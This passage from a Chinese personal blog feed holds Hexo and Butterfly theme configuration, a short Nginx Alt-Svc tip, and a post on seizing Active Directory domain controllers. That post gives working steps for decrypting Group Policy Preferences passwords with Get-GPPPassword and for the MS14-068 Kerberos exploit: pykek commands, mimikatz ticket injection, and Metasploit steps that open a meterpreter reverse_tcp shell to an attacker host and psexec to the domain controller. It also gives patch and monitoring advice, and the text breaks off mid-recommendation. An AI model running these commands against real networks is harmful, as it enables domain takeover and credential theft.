class="line">    expand: none # none/true/false</span><br><span class="line">    sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  card_tags:</span><br><span class="line">    enable: true</span><br><span class="line">    limit: 40 # if set 0 will show all</span><br><span class="line">    color: false</span><br><span class="line">    sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  card_archives:</span><br><span class="line">    enable: true</span><br><span class="line">    type: monthly # yearly or monthly</span><br><span class="line">    format: MMMM YYYY # eg: YYYY年MM月</span><br><span class="line">    order: -1 # Sort of order. 1, asc for ascending; -1, desc for descending</span><br><span class="line">    limit: 8 # if set 0 will show all</span><br><span class="line">    sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  card_webinfo:</span><br><span class="line">    enable: true</span><br><span class="line">    post_count: true</span><br><span class="line">    last_push_date: true</span><br><span class="line">    sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line"></span><br><span class="line"># busuanzi count for PV / UV in site</span><br><span class="line"># 訪問人數</span><br><span class="line">busuanzi:</span><br><span class="line">  site_uv: true</span><br><span class="line">  site_pv: true</span><br><span class="line">  page_pv: true</span><br><span class="line"></span><br><span class="line"># Time difference between publish date and now (網頁運行時間)</span><br><span class="line"># Formal: Month/Day/Year Time or Year/Month/Day Time</span><br><span class="line">runtimeshow:</span><br><span class="line">  enable: true</span><br><span class="line">  publish_date:</span><br><span class="line"></span><br><span class="line"># Aside widget - Newest Comments</span><br><span class="line">newest_comments:</span><br><span class="line">  enable: false</span><br><span class="line">  sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  limit: 6</span><br><span class="line">  storage: 10 # unit: mins, save data to localStorage</span><br><span class="line">  avatar: true</span><br><span class="line">  # You can only choose one, or neither</span><br><span class="line">  valine: false</span><br><span class="line">  github_issues:</span><br><span class="line">    enable: false</span><br><span class="line">    repo:</span><br><span class="line">  disqus:</span><br><span class="line">    enable: false</span><br><span class="line">    forum:</span><br><span class="line">    api_key:</span><br><span class="line">  twikoo: false</span><br><span class="line">  waline: false</span><br><span class="line"></span><br><span class="line"># Bottom right button (右下角按鈕)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Change font size</span><br><span class="line">change_font_size: false</span><br><span class="line"></span><br><span class="line"># Conversion between Traditional and Simplified Chinese (簡繁轉換)</span><br><span class="line">translate:</span><br><span class="line">  enable: false</span><br><span class="line">  # The text of a button</span><br><span class="line">  default: 繁</span><br><span class="line">  # the language of website (1 - Traditional Chinese/ 2 - Simplified Chinese）</span><br><span class="line">  defaultEncoding: 2</span><br><span class="line">  # Time delay</span><br><span class="line">  translateDelay: 0</span><br><span class="line">  # The text of the button when the language is Simplified Chinese</span><br><span class="line">  msgToTraditionalChinese: &#x27;繁&#x27;</span><br><span class="line">  # The text of the button when the language is Traditional Chinese</span><br><span class="line">  msgToSimplifiedChinese: &#x27;簡&#x27;</span><br><span class="line"></span><br><span class="line"># Read Mode (閲讀模式)</span><br><span class="line">readmode: true</span><br><span class="line"></span><br><span class="line"># dark mode</span><br><span class="line">darkmode:</span><br><span class="line">  enable: true</span><br><span class="line">  # Toggle Button to switch dark/light mode</span><br><span class="line">  button: true</span><br><span class="line">  # Switch dark/light mode automatically (自動切換 dark mode和 light mode)</span><br><span class="line">  # autoChangeMode: 1  Following System Settings, if the system doesn&#x27;t support dark mode, it will switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: 2  Switch dark mode between 6 pm to 6 am</span><br><span class="line">  # autoChangeMode: false</span><br><span class="line">  autoChangeMode: false</span><br><span class="line"></span><br><span class="line"># Lightbox (圖片大圖查看模式)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># You can only choose one, or neither (只能選擇一個 或者 兩個都不選)</span><br><span class="line"></span><br><span class="line"># medium-zoom</span><br><span class="line"># https://github.com/francoischalifour/medium-zoom</span><br><span class="line">medium_zoom: false</span><br><span class="line"></span><br><span class="line"># fancybox</span><br><span class="line"># http://fancyapps.com/fancybox/3/</span><br><span class="line">fancybox: false</span><br><span class="line"></span><br><span class="line"># Tag Plugins settings (標籤外掛)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># mermaid</span><br><span class="line"># see https://github.com/knsv/mermaid</span><br><span class="line">mermaid:</span><br><span class="line">  enable: false</span><br><span class="line">  # built-in themes: default/forest/dark/neutral</span><br><span class="line">  theme: default</span><br><span class="line"></span><br><span class="line"># Note (Bootstrap Callout)</span><br><span class="line">note:</span><br><span class="line">  # Note tag style values:</span><br><span class="line">  #  - simple    bs-callout old alert style. Default.</span><br><span class="line">  #  - modern    bs-callout new (v2-v3) alert style.</span><br><span class="line">  #  - flat      flat callout style with background, like on Mozilla or StackOverflow.</span><br><span class="line">  #  - disabled  disable all CSS styles import of note tag.</span><br><span class="line">  style: flat</span><br><span class="line">  icons: true</span><br><span class="line">  border_radius: 3</span><br><span class="line">  # Offset lighter of background in % for modern and flat styles (modern: -12 | 12; flat: -18 | 6).</span><br><span class="line">  # Offset also applied to label tag variables. This option can work with disabled note tag.</span><br><span class="line">  light_bg_offset: 0</span><br><span class="line"></span><br><span class="line"># other</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># Pjax</span><br><span class="line"># It may contain bugs and unstable, give feedback when you find the bugs.</span><br><span class="line"># https://github.com/MoOx/pjax</span><br><span class="line">pjax:</span><br><span class="line">  enable: false</span><br><span class="line">  exclude:</span><br><span class="line">    # - xxxx</span><br><span class="line">    # - xxxx</span><br><span class="line"></span><br><span class="line"># Inject the css and script (aplayer/meting)</span><br><span class="line">aplayerInject:</span><br><span class="line">  enable: false</span><br><span class="line">  per_page: true</span><br><span class="line"></span><br><span class="line"># Snackbar (Toast Notification 彈窗)</span><br><span class="line"># https://github.com/polonel/SnackBar</span><br><span class="line"># position 彈窗位置</span><br><span class="line"># 可選 top-left / top-center / top-right / bottom-left / bottom-center / bottom-right</span><br><span class="line">snackbar:</span><br><span class="line">  enable: false</span><br><span class="line">  position: bottom-left</span><br><span class="line">  bg_light: &#x27;#49b1f5&#x27; # The background color of Toast Notification in light mode</span><br><span class="line">  bg_dark: &#x27;#121212&#x27; # The background color of Toast Notification in dark mode</span><br><span class="line"></span><br><span class="line"># https://instant.page/</span><br><span class="line"># prefetch (預加載)</span><br><span class="line">instantpage: true</span><br><span class="line"></span><br><span class="line"># https://github.com/vinta/pangu.js</span><br><span class="line"># Insert a space between Chinese character and English character (中英文之間添加空格)</span><br><span class="line">pangu:</span><br><span class="line">  enable: false</span><br><span class="line">  field: site # site/post</span><br><span class="line"></span><br><span class="line"># Lazyload (圖片懶加載)</span><br><span class="line"># https://github.com/verlok/vanilla-lazyload</span><br><span class="line">lazyload:</span><br><span class="line">  enable: false</span><br><span class="line">  field: site # site/post</span><br><span class="line">  placeholder:</span><br><span class="line">  blur: false</span><br><span class="line"></span><br><span class="line"># PWA</span><br><span class="line"># See https://github.com/JLHwung/hexo-offline</span><br><span class="line"># ---------------</span><br><span class="line"># pwa:</span><br><span class="line">#   enable: false</span><br><span class="line">#   manifest: /pwa/manifest.json</span><br><span class="line">#   apple_touch_icon: /pwa/apple-touch-icon.png</span><br><span class="line">#   favicon_32_32: /pwa/32.png</span><br><span class="line">#   favicon_16_16: /pwa/16.png</span><br><span class="line">#   mask_icon: /pwa/safari-pinned-tab.svg</span><br><span class="line"></span><br><span class="line"># Open graph meta tags</span><br><span class="line"># https://developers.facebook.com/docs/sharing/webmasters/</span><br><span class="line">Open_Graph_meta: true</span><br><span class="line"></span><br><span class="line"># Add the vendor prefixes to ensure compatibility</span><br><span class="line">css_prefix: true</span><br><span class="line"></span><br><span class="line"># Inject</span><br><span class="line"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span><br><span class="line"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span><br><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    # - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span><br><span class="line">  bottom:</span><br><span class="line">    # - &lt;script src=&quot;xxxx&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># CDN</span><br><span class="line"># Don&#x27;t modify the following settings unless you know how they work</span><br><span class="line"># 非必要請不要修改</span><br><span class="line">CDN:</span><br><span class="line">  # main</span><br><span class="line">  main_css: /css/index.css</span><br><span class="line">  jquery: https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js</span><br><span class="line">  main: /js/main.js</span><br><span class="line">  utils: /js/utils.js</span><br><span class="line"></span><br><span class="line">  # pjax</span><br><span class="line">  pjax: https://cdn.jsdelivr.net/npm/pjax/pjax.min.js</span><br><span class="line"></span><br><span class="line">  # comments</span><br><span class="line">  gitalk: https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js</span><br><span class="line">  gitalk_css: https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css</span><br><span class="line">  valine: https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js</span><br><span class="line">  disqusjs: https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqus.js</span><br><span class="line">  disqusjs_css: https://cdn.jsdelivr.net/npm/disqusjs@1/dist/disqusjs.css</span><br><span class="line">  utterances: https://utteranc.es/client.js</span><br><span class="line">  twikoo: https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js</span><br><span class="line">  waline: https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js</span><br><span class="line"></span><br><span class="line">  # share</span><br><span class="line">  addtoany: https://static.addtoany.com/menu/page.js</span><br><span class="line">  sharejs: https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js</span><br><span class="line">  sharejs_css: https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css</span><br><span class="line"></span><br><span class="line">  # search</span><br><span class="line">  local_search: /js/search/local-search.js</span><br><span class="line">  algolia_js: /js/search/algolia.js</span><br><span class="line">  algolia_search: https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js</span><br><span class="line">  algolia_search_css: https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css</span><br><span class="line"></span><br><span class="line">  # math</span><br><span class="line">  mathjax: https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js</span><br><span class="line">  katex: https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css</span><br><span class="line">  katex_copytex: https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js</span><br><span class="line">  katex_copytex_css: https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css</span><br><span class="line">  mermaid: https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js</span><br><span class="line"></span><br><span class="line">  # count</span><br><span class="line">  busuanzi: //busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js</span><br><span class="line"></span><br><span class="line">  # background effect</span><br><span class="line">  canvas_ribbon: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js</span><br><span class="line">  canvas_fluttering_ribbon: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js</span><br><span class="line">  canvas_nest: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js</span><br><span class="line"></span><br><span class="line">  lazyload: https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js</span><br><span class="line">  instantpage: https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js</span><br><span class="line">  typed: https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js</span><br><span class="line">  pangu: https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js</span><br><span class="line"></span><br><span class="line">  # photo</span><br><span class="line">  fancybox_css: https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css</span><br><span class="line">  fancybox: https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js</span><br><span class="line">  medium_zoom: https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js</span><br><span class="line"></span><br><span class="line">  # snackbar</span><br><span class="line">  snackbar_css: https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css</span><br><span class="line">  snackbar: https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js</span><br><span class="line"></span><br><span class="line">  # effect</span><br><span class="line">  activate_power_mode: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js</span><br><span class="line">  fireworks: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js</span><br><span class="line">  click_heart: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js</span><br><span class="line">  ClickShowText: https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js</span><br><span class="line"></span><br><span class="line">  # fontawesome</span><br><span class="line">  fontawesome: https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css</span><br><span class="line"></span><br><span class="line">  # Conversion between Traditional and Simplified Chinese</span><br><span class="line">  translate: /js/tw_cn.js</span><br><span class="line"></span><br><span class="line">  # justifiedGallery</span><br><span class="line">  justifiedGallery_js: https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js</span><br><span class="line">  justifiedGallery_css: https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css</span><br><span class="line"></span><br><span class="line">  # aplayer</span><br><span class="line">  aplayer_css: https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css</span><br><span class="line">  aplayer_js: https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js</span><br><span class="line">  meting_js: https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js</span><br><span class="line"></span><br><span class="line">  # Prism.js</span><br><span class="line">  prismjs_js: https://cdn.jsdelivr.net/npm/prismjs/prism.min.js</span><br><span class="line">  prismjs_lineNumber_js: https://cdn.jsdelivr.net/npm/prismjs/plugins/line-numbers/prism-line-numbers.min.js</span><br><span class="line">  prismjs_autoloader: https://cdn.jsdelivr.net/npm/prismjs/plugins/autoloader/prism-autoloader.min.js</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>_config.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Hexo Configuration</span><br><span class="line">## Docs: https://hexo.io/docs/configuration.html</span><br><span class="line">## Source: https://github.com/hexojs/hexo/</span><br><span class="line"></span><br><span class="line"># Site</span><br><span class="line">title: Jindom&#x27;s Blog</span><br><span class="line">subtitle: &#x27;一个记笔记的地方&#x27;</span><br><span class="line">description: &#x27;&#x27;</span><br><span class="line">keywords:</span><br><span class="line">author: Jindom</span><br><span class="line">language: zh-CN</span><br><span class="line">timezone: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: https://blog.jinzz.cc</span><br><span class="line">permalink: :hash/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br><span class="line"></span><br><span class="line"># Directory</span><br><span class="line">source_dir: source</span><br><span class="line">public_dir: public</span><br><span class="line">tag_dir: tags</span><br><span class="line">archive_dir: archives</span><br><span class="line">category_dir: categories</span><br><span class="line">code_dir: downloads/code</span><br><span class="line">i18n_dir: :lang</span><br><span class="line">skip_render:</span><br><span class="line"></span><br><span class="line"># Writing</span><br><span class="line">new_post_name: :title.md # File name of new posts</span><br><span class="line">default_layout: post</span><br><span class="line">titlecase: false # Transform title into titlecase</span><br><span class="line">external_link:</span><br><span class="line">  enable: true # Open external links in new tab</span><br><span class="line">  field: site # Apply to the whole site</span><br><span class="line">  exclude: &#x27;&#x27;</span><br><span class="line">filename_case: 0</span><br><span class="line">render_drafts: false</span><br><span class="line">post_asset_folder: false</span><br><span class="line">relative_link: false</span><br><span class="line">future: true</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: false</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace: &#x27;&#x27;</span><br><span class="line">  wrap: true</span><br><span class="line">  hljs: false</span><br><span class="line">prismjs:</span><br><span class="line">  enable: false</span><br><span class="line">  preprocess: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># Home page setting</span><br><span class="line"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span><br><span class="line"># per_page: Posts displayed per page. (0 = disable pagination)</span><br><span class="line"># order_by: Posts order. (Order by date descending by default)</span><br><span class="line">index_generator:</span><br><span class="line">  path: &#x27;&#x27;</span><br><span class="line">  per_page: 20</span><br><span class="line">  order_by: -date</span><br><span class="line"></span><br><span class="line"># Category &amp; Tag</span><br><span class="line">default_category: uncategorized</span><br><span class="line">category_map:</span><br><span class="line">tag_map:</span><br><span class="line"></span><br><span class="line"># Metadata elements</span><br><span class="line">## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta</span><br><span class="line">meta_generator: true</span><br><span class="line"></span><br><span class="line"># Date / Time format</span><br><span class="line">## Hexo uses Moment.js to parse and display date</span><br><span class="line">## You can customize the date format as defined in</span><br><span class="line">## http://momentjs.com/docs/#/displaying/format/</span><br><span class="line">date_format: YYYY-MM-DD</span><br><span class="line">time_format: HH:mm:ss</span><br><span class="line">## updated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span><br><span class="line">updated_option: &#x27;mtime&#x27;</span><br><span class="line"></span><br><span class="line"># Pagination</span><br><span class="line">## Set per_page to 0 to disable pagination</span><br><span class="line">per_page: 10</span><br><span class="line">pagination_dir: page</span><br><span class="line"></span><br><span class="line"># Include / Exclude file(s)</span><br><span class="line">## include:/exclude: options only apply to the &#x27;source/&#x27; folder</span><br><span class="line">include:</span><br><span class="line">exclude:</span><br><span class="line">ignore:</span><br><span class="line"></span><br><span class="line"># Extensions</span><br><span class="line">## Plugins: https://hexo.io/plugins/</span><br><span class="line">## Themes: https://hexo.io/themes/</span><br><span class="line">theme: butterfly</span><br><span class="line"></span><br><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: &#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Local search</span><br><span class="line">#search:</span><br><span class="line">#  path: search.xml</span><br><span class="line">#  field: post</span><br><span class="line">#  content: true</span><br><span class="line">#  template: ./search.xml</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Nginx启用Alt-Svc加速网站访问速度</title>
      <link href="57793b1394cf/"/>
      <url>57793b1394cf/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx启用Alt-Svc加速网站访问速度"><a href="#Nginx启用Alt-Svc加速网站访问速度" class="headerlink" title="Nginx启用Alt-Svc加速网站访问速度"></a>Nginx启用Alt-Svc加速网站访问速度</h1><p>参考链接 <a href="https://imququ.com/post/http-alt-svc.html">https://imququ.com/post/http-alt-svc.html</a> <a href="https://v2ex.com/t/753299">https://v2ex.com/t/753299</a> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Alt-Svc">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Alt-Svc</a></p><p>国内家宽无80,443等端口开放权限，所以可以通过vps反带端口的方式转发网站,但由于多重代理造成的延迟会拖慢访问速度 逛v2ex的时候发现有启用Alt-Svc Header的方式,让支持的浏览器直接访问非标准端口通信</p><p>修改方法:  nginx 配置文件中添加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_header Alt-Svc h2=&quot;101.228.73.254:44300&quot;;</span><br></pre></td></tr></table></figure><p>h2的意思是http2.0协议，相应的可以把h2替换成h3或者http/1.1来指定不同的协议</p><p>如果在浏览器的response包标头中看到了alt-svc,request包标头中看到了alt-used这两个header就说明浏览器支持,并且通信流量都走了配置的源站地址</p><p><img src="/images/wp_editor_md_b3dc0b5caf5c5ca7c52091023c2f9c7d.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 网络运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AD拿域控权限的方法整理</title>
      <link href="54a54b32a7f3/"/>
      <url>54a54b32a7f3/</url>
      
        <content type="html"><![CDATA[<h1 id="AD拿域控的几种方法"><a href="#AD拿域控的几种方法" class="headerlink" title="AD拿域控的几种方法"></a>AD拿域控的几种方法</h1><h2 id="1-SYSVOL和组策略中的密码获取"><a href="#1-SYSVOL和组策略中的密码获取" class="headerlink" title="1.SYSVOL和组策略中的密码获取"></a>1.SYSVOL和组策略中的密码获取</h2><p>这种方法是最简单的，因为不需要特殊的工具，打开Windows资源管理器并搜索域名为SYSVOL DFS共享的XML文件。在大多数情况下，XML格式的文件包含密码凭据有：<code>`groups.xml scheduledtasks.xml Services.xml```等文件。SYSVOL是AD中的所有经过身份认证的用户具有可读可访问权限的域共享目录文件。SYSVOL包含登录脚本，组策略数据以及需要在具有任何域控可用的域数据（由于SYSVOL在所有域控制器之间自动同步并共享）。所有域组策略都存储的位置：```\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\`</code></p><p>当创建新的GPP时，就会在SYSVOL中创建一个与相关配置数据关联的XML文件，如果提供了密码，那么AES-256位加密应是足够强的。微软在MSDN上发布了可用于解密密码的AES加密密钥（共享密钥），连接地址：</p><p><a href="https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</a> （可用于解密密码）由于经过身份认证的用户（任何域用户或受信任域中的用户）都具有对SYSVOL的可读权限，所以域中的任何人都可以搜索包含“cpassword”关键字的XML文件中的SYSVOL共享，该文件是包含AES加密密码值。</p><p>PowerSploit项目中的Get-GPPPassword脚本可用来解密，其连接地址为：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>使用方法： powershell import-modulo .\Get-GPPpassword.ps1;Get-GppPassword</p><h3 id="安全建议："><a href="#安全建议：" class="headerlink" title="安全建议："></a>安全建议：</h3><p>在用于管理GPO的每台计算机上安装KB2962486补丁，以防止新的凭据被写入到组策略首选项中 删除包含密码的SYSVOL中出现的GPP xml文件。 不要将密码放在所有未经过身份验证的用户可访问的文件中。</p><h2 id="2-AD域控上的MS14-068-Kerberos漏洞"><a href="#2-AD域控上的MS14-068-Kerberos漏洞" class="headerlink" title="2.AD域控上的MS14-068 Kerberos漏洞"></a>2.AD域控上的MS14-068 Kerberos漏洞</h2><p><img src="/images/upload_9b3fd3af96b84bc59da85b723f1829b1.png"> 简单地说，利用MS14-068攻击需要不到5分钟的时间，使攻击者重写一个有效的Kerberos TGT身份验证机票，并且，使其成为域管理员（和企业管理员）。如上图所示，这就像采取有效的登机密码，在登机前，写上“飞行员”。 然后在登机时，你被护送到驾驶舱，问你是否在起飞前要喝咖啡。</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek</a></p><h4 id="Windows系统具体步骤如下："><a href="#Windows系统具体步骤如下：" class="headerlink" title="Windows系统具体步骤如下："></a>Windows系统具体步骤如下：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.导出当前登录账号test的sid值：</span><br><span class="line">whoami/all&gt;sid.txt</span><br><span class="line">2.查看当前域控主机名：</span><br><span class="line">dsquery server &amp;&amp; net time /domain</span><br><span class="line">3.生成TGT:</span><br><span class="line">python ms14-068.py -u test@bk.com -s S-1-5-21-3151896982-173628731-3220273337-1007 -d  DC. bk.com</span><br><span class="line">4.注入生成的TGT并获得有效的TGS：</span><br><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_user-a-1@dom-a.loc.ccache&quot; exit</span><br></pre></td></tr></table></figure><p><img src="/images/upload_26ff1214d9ee432d28e9d3c41c1f6017.png"></p><h4 id="Kali具体步骤如下"><a href="#Kali具体步骤如下" class="headerlink" title="Kali具体步骤如下"></a>Kali具体步骤如下</h4><p>Kali下面默认还没有安装kerberos的认证功能，所以我们首先要安装一个kerberos客户端：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install  krb5-user</span><br></pre></td></tr></table></figure><p>然后手动设置IP地址，并将本机的DNS设置为目标域控制器主机的IP地址，这里设置为DC.bk.com对应主机IP：192.168.1.106</p><p><img src="/images/upload_1300fa7233c2216bd8f9be1e0cd33b33.png"></p><p><img src="/images/upload_8e3cb7896d5b27c773d638b0ac3a3066.png"></p><h4 id="MSF具体步骤"><a href="#MSF具体步骤" class="headerlink" title="MSF具体步骤"></a>MSF具体步骤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf&gt; use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line">msf&gt; show options</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set DOMAIN bk.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set PASSWORD wen@126.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set USER test</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set USER_SID S-1-5-21-3151896982-173628731-3220273337-1007</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; set RHOST DC.bk.com</span><br><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; run</span><br></pre></td></tr></table></figure><p><img src="/images/upload_b979d4213f515d1c085c6283fb7e2513.png"> <img src="/images/upload_369b33f6d775f648666b92d092f1b736.png"> <img src="/images/upload_e0a27032cdc810789fe84e632450b91b.png"></p><p>然后使用mimikatz处理MSF生成的BIN文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz #</span><br><span class="line">kerberos::clist &quot; 20170712232847_default_192.168.1.106_windows.kerberos_515998.bin&quot; /export</span><br></pre></td></tr></table></figure><p>回去MSF接shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf auxiliary(ms14_068_kerberos_checksum) &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(handler) &gt; set lhost  192.168.1.102</span><br><span class="line">msf exploit(handler) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; kerberos_ticket_use /tmp/0-00000000-juan@krbtgt-DEMO.LOCAL.kirbi</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(handler) &gt; sessions</span><br><span class="line">msf exploit(handler) &gt; use exploit/windows/local/current_user_psexec</span><br><span class="line">msf exploit(current_user_psexec) &gt; set TECHNIQUE PSH</span><br><span class="line">msf exploit(current_user_psexec) &gt; set RHOSTS DC.bk.com</span><br><span class="line">msf exploit(current_user_psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(current_user_psexec) &gt; set lhost 192.168.1.102</span><br><span class="line">msf exploit(current_user_psexec) &gt; set SESSION 1</span><br><span class="line">msf exploit(current_user_psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure><h4 id="实际利用过程"><a href="#实际利用过程" class="headerlink" title="实际利用过程"></a>实际利用过程</h4><p>MS14-068漏洞利用过程：</p><ol><li>请求没有PAC作为普通用户的Kerberos TGT身份验证凭证，DC使用TGT进行回复</li><li>生成一个没有密钥伪造的PAC，所以生成PAC域用户密码数据是使用MD5算法而不是HMAC_MD5“签名”。</li><li>将没有PAC的TGT发送到DC，将伪造的PAC作为授权数据TGS服务票证请求的一部分</li><li>DC似乎被这个混淆了，所以它丢弃用户发送没有PAC的TGT，创建一个新的TGT，并将伪造的PAC插入到自己的授权数据中，并将这个TGT发送给用户</li><li>具有伪造PAC的TGT使用户能够成为易受攻击的DC的域管理员。</li></ol><p>Benjamin Delpy（Mimikatz的作者）写了一个叫做Kekeo的MS14-068漏洞利用工具（<a href="https://github.com/gentilkiwi/kekeo/releases">https://github.com/gentilkiwi/kekeo/releases</a>） 它能找到并定位一个易受攻击的DC，并且可以在其执行，无论是否安装了补丁的2012 / 2012R2 DC的主机上，它具有与PyKEK相同的利用攻击方法，但是在结束时增加了另一个步骤，导致有一个有效的TGT，可以呈现给域中的任何DC，它通过使用生成的TGT来获取在任何地方执行的模拟TGT。</p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><ol><li>在每个AD域中安装KB3011780 。作者上传传了一个示例脚本，以获取所有域控制器的KB3011780补丁状态：Get-DCPatchStatus（将文件扩展名更改为.ps1）</li><li>对于不是域管理组成员的用户（可以登录到域控制器的默认组），监视事件ID 4672 ： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span 